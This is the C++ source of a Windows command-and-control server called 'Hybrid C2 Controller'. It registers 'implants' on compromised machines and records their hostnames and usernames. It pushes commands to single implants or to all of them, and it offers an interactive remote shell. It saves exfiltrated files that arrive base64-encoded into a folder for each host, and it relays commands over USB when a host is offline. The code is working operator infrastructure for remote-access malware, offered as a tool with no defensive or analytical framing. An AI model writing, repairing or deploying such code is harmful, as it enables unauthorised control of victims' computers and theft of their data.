// =============================================================================
// HYBRID C2 CONTROLLER - Online + Offline Combined (FINAL VERSION)
// =============================================================================

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <winhttp.h>
#include <iostream>
#include <string>
#include <vector>
#include <map>
#include <queue>
#include <thread>
#include <mutex>
#include <chrono>
#include <random>
#include <fstream>
#include <sstream>
#include <iomanip>
#include <algorithm>
#include <filesystem>
#include <memory>
#include "implant/manager.h"
#include "implant/session.h"
#include "network/manager.h"
#include "usb/manager.h"
#include "config/manager.h"
#include "cli/console.h"

#include <atomic>
#include <condition_variable>
#include <functional>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "winhttp.lib")

// =============================================================================
// JSON HELPERS
// =============================================================================

static std::string EscapeJSON(const std::string& str) {
    std::string result;
    for (char c : str) {
        switch (c) {
            case '"': result += "\\\""; break;
            case '\\': result += "\\\\"; break;
            case '\n': result += "\\n"; break;
            case '\r': result += "\\r"; break;
            case '\t': result += "\\t"; break;
            default: result += c;
        }
    }
    return result;
}

static std::string UnescapeJSON(const std::string& str) {
    std::string result;
    for (size_t i = 0; i < str.size(); i++) {
        if (str[i] == '\\' && i + 1 < str.size()) {
            switch (str[i + 1]) {
                case 'n': result += '\n'; i++; break;
                case 'r': result += '\r'; i++; break;
                case 't': result += '\t'; i++; break;
                case '"': result += '"'; i++; break;
                case '\\': result += '\\'; i++; break;
                default: result += str[i]; break;
            }
        } else {
            result += str[i];
        }
    }
    return result;
}

static std::string ExtractJSONValue(const std::string& json, const std::string& key) {
    std::string searchKey = "\"" + key + "\":\"";
    auto pos = json.find(searchKey);
    if (pos == std::string::npos) {
        searchKey = "\"" + key + "\": \"";
        pos = json.find(searchKey);
    }
    if (pos == std::string::npos) return "";
    
    pos += searchKey.size();
    auto endPos = json.find("\"", pos);
    if (endPos == std::string::npos) return "";
    
    return json.substr(pos, endPos - pos);
}

// Add this near the other static helper functions
static std::vector<BYTE> Base64DecodeStatic(const std::string& data) {
    static const int decodeTable[256] = {
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,62,-1,-1,-1,63,
        52,53,54,55,56,57,58,59,60,61,-1,-1,-1,-1,-1,-1,
        -1, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9,10,11,12,13,14,
        15,16,17,18,19,20,21,22,23,24,25,-1,-1,-1,-1,-1,
        -1,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,
        41,42,43,44,45,46,47,48,49,50,51,-1,-1,-1,-1,-1
    };
    
    std::vector<BYTE> result;
    int val = 0, valb = -8;
    
    for (char c : data) {
        if (c == '=') break;
        int idx = decodeTable[(unsigned char)c];
        if (idx == -1) continue;
        val = (val << 6) + idx;
        valb += 6;
        if (valb >= 0) {
            result.push_back((BYTE)((val >> valb) & 0xFF));
            valb -= 8;
        }
    }
    return result;
}

// =============================================================================
// HYBRID C2 CONTROLLER CLASS
// =============================================================================

class HybridC2Controller {
private:
    ConfigManager config;
    std::string realC2Domain;
    SOCKET tcpListener;
    SOCKET udpSocket;
    std::vector<SOCKET> activeSockets;
    NetworkManager netMgr;
    USBManager usbMgr;
    std::unique_ptr<CLIManager> cliMgr;
    ImplantManager implants;
    std::atomic<bool> isRunning;
    std::vector<std::thread> serverThreads;
    std::atomic<uint64_t> totalCommandsSent{0};
    std::atomic<uint64_t> totalBytesTransferred{0};
    std::chrono::system_clock::time_point startTime;
    
public:
    HybridC2Controller(const std::string& bindAddr = "0.0.0.0", uint16_t port = 443)
        : config(), tcpListener(INVALID_SOCKET), udpSocket(INVALID_SOCKET),
          isRunning(false) {
        config.bindAddress = bindAddr;
        config.bindPort = port;
        config.usbAutoDetect = true;
        startTime = std::chrono::system_clock::now();

        CLIManager::Handlers handlers;
        handlers.listImplants = [this]() { ListImplants(); };
        handlers.implantInfo = [this](const std::string& id) { ImplantInfo(id); };
        handlers.interactShell = [this](const std::string& id) { InteractShell(id); };
        handlers.checkUSBStatus = [this]() { CheckUSBStatus(); };
        handlers.checkUSBResults = [this]() { CheckUSBForResults(); };
        handlers.showStatistics = [this]() { ShowStatistics(); };
        handlers.setConfig = [this](const std::string& key, const std::string& value) { SetConfig(key, value); };
        handlers.saveConfig = [this]() { SaveConfig(); };
        handlers.executeCommand = [this](const std::string& target, const std::string& command, const std::string& channel) { ExecuteCommand(target, command, channel); };
        handlers.shutdown = [this]() { Shutdown(); };
        cliMgr = std::make_unique<CLIManager>(std::move(handlers));
    }
    
    bool Initialize() {
        std::cout << "\n[*] Initializing Hybrid C2 Controller...\n" << std::endl;
        config.Load("c2_config.json");
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            std::cerr << "[!] WSAStartup failed" << std::endl;
            return false;
        }
        tcpListener = netMgr.CreateTCPSocket();
        if (tcpListener == INVALID_SOCKET) {
            std::cerr << "[!] Failed to create TCP socket" << std::endl;
            return false;
        }
        if (!netMgr.BindAndListen(tcpListener, config.bindAddress, config.bindPort)) {
            std::cerr << "[!] Bind/listen failed on port " << config.bindPort << std::endl;
            closesocket(tcpListener);
            WSACleanup();
            return false;
        }
        std::cout << "[+] TCP Listener started on " << config.bindAddress << ":" << config.bindPort << std::endl;
        udpSocket = netMgr.CreateUDPSocket(53);
        if (udpSocket != INVALID_SOCKET) {
            std::cout << "[+] DNS Tunnel listener started on port 53" << std::endl;
        }
        if (usbMgr.IsAutoDetectEnabled()) {
            usbMgr.DetectAuthorizedUSB();
        }
        return true;
    }
    
    void Start() {
        isRunning = true;
        std::cout << R"(
╔═══════════════════════════════════════════════════════════════╗
║     HYBRID C2 CONTROLLER v3.0                                 ║
║     Type 'help' for commands                                  ║
╚═══════════════════════════════════════════════════════════════╝
)" << std::endl;
        serverThreads.emplace_back(&HybridC2Controller::HeartbeatMonitor, this);
        serverThreads.emplace_back(&HybridC2Controller::USBPollingThread, this);
        if (tcpListener != INVALID_SOCKET) {
            netMgr.StartAcceptLoop(tcpListener, [this](SOCKET s, sockaddr_in addr){
                std::thread t(&HybridC2Controller::HandleTCPConnection, this, s, addr);
                t.detach();
            });
        }
        if (udpSocket != INVALID_SOCKET) {
            netMgr.StartUDPMonitor(udpSocket, [this](const char* data, int size, const sockaddr_in& addr){
                ProcessDNSTunnelPacket(data, size, const_cast<sockaddr_in&>(addr));
            });
        }
        if (cliMgr) cliMgr->Run();
    }
    
    void Shutdown() {
        std::cout << "\n[*] Shutting down...\n" << std::endl;
        isRunning = false;
        implants.ForEach([this](ImplantManager::ImplantPtr imp){
            if (imp && imp->isOnline) { closesocket(imp->socket); }
        });
        if (tcpListener != INVALID_SOCKET) closesocket(tcpListener);
        if (udpSocket != INVALID_SOCKET) closesocket(udpSocket);
        for (auto& thread : serverThreads) {
            if (thread.joinable()) thread.join();
        }
        WSACleanup();
        std::cout << "[+] Shutdown complete" << std::endl;
    }
    
private:
    void HandleTCPConnection(SOCKET clientSocket, sockaddr_in clientAddr) {
        char ipStr[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &clientAddr.sin_addr, ipStr, INET_ADDRSTRLEN);
        std::cout << "\n[*] New TCP connection from " << ipStr << std::endl;
        
        auto implant = PerformHandshake(clientSocket, ipStr, "TCP");
        if (!implant) {
            std::cerr << "[!] Handshake failed for " << ipStr << std::endl;
            closesocket(clientSocket);
            return;
        }
        implant->socket = clientSocket;
        implant->isOnline = true;
        implants.Add(implant);
        std::cout << "[+] Implant registered: " << implant->hostname << " (" << implant->implantId << ")" << std::endl;
        CommunicationLoop(implant);
    }
    
    std::shared_ptr<ImplantSession> PerformHandshake(SOCKET socket, const std::string& ip, const std::string& connType) {
        char buffer[4096];
        int received = recv(socket, buffer, sizeof(buffer) - 1, 0);
        if (received <= 0) return nullptr;
        buffer[received] = 0;
        std::string regData(buffer);
        
        auto implant = std::make_shared<ImplantSession>();
        implant->ipAddress = ip;
        implant->connectionType = connType;
        implant->connectedAt = std::chrono::system_clock::now();
        implant->lastSeen = implant->connectedAt;
        implant->sleepTime = 60;
        implant->jitter = 30;
        implant->implantId = ExtractJSONValue(regData, "id");
        implant->hostname = ExtractJSONValue(regData, "hostname");
        implant->username = ExtractJSONValue(regData, "username");
        implant->osVersion = ExtractJSONValue(regData, "os");
        
        std::string ack = "{\"status\":\"ok\",\"heartbeat\":30}";
        send(socket, ack.c_str(), (int)ack.size(), 0);
        return implant;
    }
    
    void CommunicationLoop(std::shared_ptr<ImplantSession> implant) {
        char buffer[65536];
        while (isRunning && implant->isOnline) {
            fd_set readSet;
            FD_ZERO(&readSet);
            FD_SET(implant->socket, &readSet);
            timeval timeout = {1, 0};
            int result = select(0, &readSet, NULL, NULL, &timeout);
            if (result > 0) {
                int received = recv(implant->socket, buffer, sizeof(buffer) - 1, 0);
                if (received <= 0) { implant->isOnline = false; break; }
                buffer[received] = 0;
                ProcessImplantResponse(implant, std::string(buffer));
                totalBytesTransferred += received;
            }
            SendPendingCommands(implant);
        }
        closesocket(implant->socket);
        implant->isOnline = false;
    }
    
void ProcessImplantResponse(std::shared_ptr<ImplantSession> implant, const std::string& response) {
    implant->lastSeen = std::chrono::system_clock::now();
    
    if (response.find("\"type\":\"heartbeat\"") != std::string::npos) return;
    
    if (response.find("\"type\":\"result\"") != std::string::npos) {
        std::string result = ExtractJSONValue(response, "data");
        result = UnescapeJSON(result);
        
        // Check if it's a file download (starts with "FILE:")
        if (result.size() >= 5 && result.substr(0, 5) == "FILE:") {
            // Parse: FILE:filename:filesize:base64data
            size_t pos1 = result.find(':', 5);
            size_t pos2 = result.find(':', pos1 + 1);
            
            if (pos1 != std::string::npos && pos2 != std::string::npos) {
                std::string fileName = result.substr(5, pos1 - 5);
                std::string fileSizeStr = result.substr(pos1 + 1, pos2 - pos1 - 1);
                std::string b64Data = result.substr(pos2 + 1);
                
                // Create downloads directory
                std::string downloadDir = "downloads\\" + implant->hostname;
                CreateDirectoryA("downloads", nullptr);
                CreateDirectoryA(downloadDir.c_str(), nullptr);
                
                std::string savePath = downloadDir + "\\" + fileName;
                
                // Decode Base64
                std::vector<BYTE> decoded = Base64DecodeStatic(b64Data);
                
                // Save to file
                std::ofstream file(savePath, std::ios::binary);
                if (file) {
                    file.write((char*)decoded.data(), decoded.size());
                    file.close();
                    
                    std::string msg = "[+] File downloaded: " + savePath + 
                                     " (" + std::to_string(decoded.size()) + " bytes)";
                    implant->commandResults.push(msg);
                    std::cout << "\n" << msg << std::endl;
                } else {
                    std::string msg = "[!] Failed to save: " + savePath;
                    implant->commandResults.push(msg);
                    std::cout << "\n" << msg << std::endl;
                }
            } else {
                implant->commandResults.push("[!] Invalid file format");
            }
        } else {
            // Regular command result
            implant->commandResults.push(result);
        }
    }
}
    
    void SendPendingCommands(std::shared_ptr<ImplantSession> implant) {
        while (!implant->pendingCommands.empty()) {
            std::string cmd = implant->pendingCommands.front();
            implant->pendingCommands.pop();
            if (SendNetworkCommand(implant, cmd)) totalCommandsSent++;
        }
    }
    
    bool SendNetworkCommand(std::shared_ptr<ImplantSession> implant, const std::string& command) {
        std::string packet = "{\"type\":\"command\",\"cmd\":\"" + EscapeJSON(command) + "\"}";
        int sent = send(implant->socket, packet.c_str(), (int)packet.size(), 0);
        totalBytesTransferred += sent;
        return sent == (int)packet.size();
    }
    
    void HeartbeatMonitor() {
        while (isRunning) {
            auto now = std::chrono::system_clock::now();
            auto list = implants.List();
            for (auto& implant : list) {
                if (!implant) continue;
                if (implant->isOnline) {
                    auto lastSeen = std::chrono::duration_cast<std::chrono::seconds>(now - implant->lastSeen).count();
                    if (lastSeen > 300) {
                        std::cout << "\n[!] Implant " << implant->hostname << " timed out" << std::endl;
                        closesocket(implant->socket);
                        implant->isOnline = false;
                    }
                }
                if (!implant->isOnline) {
                    auto offline = std::chrono::duration_cast<std::chrono::hours>(now - implant->lastSeen).count();
                    if (offline > 24) implants.Remove(implant->implantId);
                }
            }
            std::this_thread::sleep_for(std::chrono::seconds(30));
        }
    }
    
    void USBPollingThread() {
        while (isRunning) {
            auto results = usbMgr.PollResults();
            for (auto& data : results) std::cout << "\n[+] USB Result: " << data << std::endl;
            std::this_thread::sleep_for(std::chrono::seconds(10));
        }
    }
    
    void ProcessDNSTunnelPacket(const char* data, int size, sockaddr_in& clientAddr) {}
    
    void CheckUSBForResults() {
        auto results = usbMgr.PollResults();
        for (auto& data : results) std::cout << "\n[+] USB Result: " << data << std::endl;
    }
    
    bool SendCommandViaUSB(const std::string& implantId, const std::string& command) {
        if (!usbMgr.HasAuthorizedUSB() && usbMgr.IsAutoDetectEnabled()) usbMgr.DetectAuthorizedUSB();
        return usbMgr.SendCommandToUSB(implantId, command);
    }
    
public:
    void ExecuteCommand(const std::string& targetId, const std::string& command, const std::string& channel = "auto") {
        if (targetId == "all" || targetId == "*") {
            auto list = implants.List();
            for (auto& imp : list) SendCommandToImplant(imp, command, channel);
            std::cout << "[+] Command broadcast to " << implants.Size() << " implants" << std::endl;
            return;
        }
        auto impl = implants.Get(targetId);
        if (impl) { SendCommandToImplant(impl, command, channel); return; }
        auto partial = implants.FindByPrefix(targetId);
        if (partial) { SendCommandToImplant(partial, command, channel); return; }
        std::cout << "[!] Implant not found: " << targetId << std::endl;
    }
    
private:
    void SendCommandToImplant(std::shared_ptr<ImplantSession> implant, const std::string& command, const std::string& channel) {
        if (channel == "auto") {
            if (implant->isOnline) implant->pendingCommands.push(command);
            else SendCommandViaUSB(implant->implantId, command);
        } else if (channel == "tcp" || channel == "https") {
            if (implant->isOnline) implant->pendingCommands.push(command);
        } else if (channel == "usb") {
            SendCommandViaUSB(implant->implantId, command);
        }
    }
    
    void ListImplants() {
        std::cout << "\n╔══════════════════════════════════════════════════════════════════════╗\n";
        std::cout << "║                         ACTIVE IMPLANTS                             ║\n";
        std::cout << "╠══════╦═════════════════╦══════════════╦══════════╦══════╦══════════╣\n";
        std::cout << "║ ID   ║ Hostname        ║ Username     ║ IP Addr  ║ Conn ║ Status   ║\n";
        std::cout << "╠══════╬═════════════════╬══════════════╬══════════╬══════╬══════════╣\n";
        auto list = implants.List();
        for (auto& imp : list) {
            if (!imp) continue;
            printf("║ %-4s ║ %-15s ║ %-12s ║ %-8s ║ %-4s ║ %-8s ║\n",
                   imp->implantId.substr(0, 6).c_str(),
                   imp->hostname.substr(0, 15).c_str(),
                   imp->username.substr(0, 12).c_str(),
                   imp->ipAddress.c_str(),
                   imp->connectionType.c_str(),
                   imp->isOnline ? "Online" : "Offline");
        }
        std::cout << "╚══════╩═════════════════╩══════════════╩══════════╩══════╩══════════╝\n";
    }
    
    void ImplantInfo(const std::string& id) {
        auto impl = implants.Get(id);
        if (!impl) { auto p = implants.FindByPrefix(id); if (p) { DisplayImplantDetails(p); return; } std::cout << "[!] Implant not found" << std::endl; return; }
        DisplayImplantDetails(impl);
    }
    
void DisplayImplantDetails(std::shared_ptr<ImplantSession> imp) {
    auto now = std::chrono::system_clock::now();
    auto uptime = std::chrono::duration_cast<std::chrono::hours>(now - imp->connectedAt).count();
    auto idle = std::chrono::duration_cast<std::chrono::seconds>(now - imp->lastSeen).count();
    std::cout << "\n╔══════════════════════════════════╗\n";
    std::cout << "║     IMPLANT DETAILS              ║\n";
    std::cout << "╠══════════════════════════════════╣\n";
    printf("║ ID:       %-22s ║\n", imp->implantId.substr(0, 22).c_str());
    printf("║ Hostname: %-22s ║\n", imp->hostname.substr(0, 22).c_str());
    printf("║ Username: %-22s ║\n", imp->username.substr(0, 22).c_str());
    printf("║ OS:       %-22s ║\n", imp->osVersion.substr(0, 22).c_str());
    printf("║ IP:       %-22s ║\n", imp->ipAddress.substr(0, 22).c_str());
    printf("║ Channel:  %-22s ║\n", imp->connectionType.substr(0, 22).c_str());
    printf("║ Status:   %-22s ║\n", imp->isOnline ? "ONLINE" : "OFFLINE");
    
    // Fix these two lines - change %lld to %d:
    std::cout << "║ Uptime:   " << std::setw(22) << std::left << uptime << "║\n";
    std::cout << "║ Idle:     " << std::setw(22) << std::left << idle << "║\n";
    
    std::cout << "╚══════════════════════════════════╝\n";
}
    
    // =========================================================================
    // INTERACTIVE SHELL - Fixed version
    // =========================================================================
    
    void InteractShell(const std::string& id) {
        auto imp = implants.Get(id);
        if (!imp) { 
            imp = implants.FindByPrefix(id); 
            if (!imp) { 
                std::cout << "[!] Implant not found: " << id << std::endl; 
                return; 
            } 
        }
        
        if (!imp->isOnline) {
            std::cout << "[!] Implant " << imp->hostname << " is offline" << std::endl;
            return;
        }
        
        std::cout << "\n[*] Entering interactive shell for " << imp->hostname << std::endl;
        std::cout << "[*] Type 'exit' to return to C2> controller\n" << std::endl;
        
        std::string cmd;
        while (isRunning && imp->isOnline) {
            // Show implant prompt
            std::cout << "[" << imp->hostname << "]> ";
            std::getline(std::cin, cmd);
            
            // Check for exit
            if (cmd == "exit" || cmd == "back" || cmd == "quit") {
                std::cout << "[*] Returning to C2> controller..." << std::endl;
                break;
            }
            
            if (cmd.empty()) continue;
            
            // Send command to implant
            std::string packet = "{\"type\":\"command\",\"cmd\":\"" + EscapeJSON(cmd) + "\"}";
            int sent = send(imp->socket, packet.c_str(), (int)packet.size(), 0);
            
            if (sent <= 0) {
                std::cout << "[!] Failed to send command. Connection may be lost." << std::endl;
                break;
            }
            totalCommandsSent++;
            
            // Wait for response
            auto waitStart = std::chrono::steady_clock::now();
            bool gotResponse = false;
            
            while (isRunning) {
                // Check for response
                if (!imp->commandResults.empty()) {
                    std::string result = imp->commandResults.front();
                    imp->commandResults.pop();
                    
                    // Print result nicely
                    if (!result.empty()) {
                        std::cout << result;
                        if (result.back() != '\n') std::cout << std::endl;
                    }
                    gotResponse = true;
                    break;
                }
                
                // Timeout after 10 seconds
                auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(
                    std::chrono::steady_clock::now() - waitStart).count();
                if (elapsed > 10) {
                    std::cout << "[!] Command timed out" << std::endl;
                    break;
                }
                
                std::this_thread::sleep_for(std::chrono::milliseconds(100));
            }
            
            // Check if still connected
            if (!imp->isOnline) {
                std::cout << "[!] Implant disconnected" << std::endl;
                break;
            }
        }
        
        // Return to C2 prompt
        std::cout << "\nC2> Type 'help' for commands" << std::endl;
    }
    
    void CheckUSBStatus() {
        if (usbMgr.IsAutoDetectEnabled()) usbMgr.DetectAuthorizedUSB();
        auto info = usbMgr.GetDriveInfo();
        if (info.authorized) {
            std::cout << "[+] USB Drive: " << info.driveLetter << std::endl;
            std::cout << "    Total: " << (info.totalBytes/(1024*1024*1024)) << " GB\n";
            std::cout << "    Free: " << (info.freeBytes/(1024*1024)) << " MB\n";
        } else {
            std::cout << "[-] No authorized USB detected" << std::endl;
        }
    }
    
    void ShowStatistics() {
        auto now = std::chrono::system_clock::now();
        auto uptime = std::chrono::duration_cast<std::chrono::hours>(now - startTime).count();
        std::cout << "\n=== C2 Statistics ===\n";
        std::cout << "Uptime: " << uptime << " hours\n";
        std::cout << "Active Implants: " << implants.Size() << "\n";
        std::cout << "Total Commands: " << totalCommandsSent << "\n";
        std::cout << "Data Transferred: " << (totalBytesTransferred/(1024*1024)) << " MB\n";
        std::cout << "USB Drive: " << (usbMgr.GetUSBDriveLetter().empty() ? "None" : usbMgr.GetUSBDriveLetter()) << "\n";
    }
    
    void SetConfig(const std::string& key, const std::string& value) {
        if (key == "usb") { usbMgr.SetUSBDriveLetter(value); std::cout << "[+] USB drive set to " << value << std::endl; }
        else if (!config.SetConfigKey(key, value)) std::cout << "[!] Unknown setting: " << key << std::endl;
    }
    
    void SaveConfig() {
        if (config.Save("c2_config.json")) std::cout << "[+] Configuration saved" << std::endl;
        else std::cout << "[!] Failed to save configuration" << std::endl;
    }
};

// =============================================================================
// MAIN ENTRY POINT
// =============================================================================

int main(int argc, char* argv[]) {
    for (int i = 1; i < argc; ++i) {
        std::string a = argv[i];
        if (a == "--help" || a == "-h") {
            std::cout << "Usage: c2_controller [bind_address] [port]\n";
            std::cout << "  c2_controller 0.0.0.0 8443\n";
            return 0;
        }
    }
    std::string bindAddr = (argc >= 2) ? argv[1] : "0.0.0.0";
    uint16_t port = (argc >= 3) ? (uint16_t)std::stoi(argv[2]) : 8443;
    
    HybridC2Controller controller(bindAddr, port);
    if (!controller.Initialize()) { std::cerr << "[!] Failed to initialize" << std::endl; return 1; }
    controller.Start();
    return 0;
}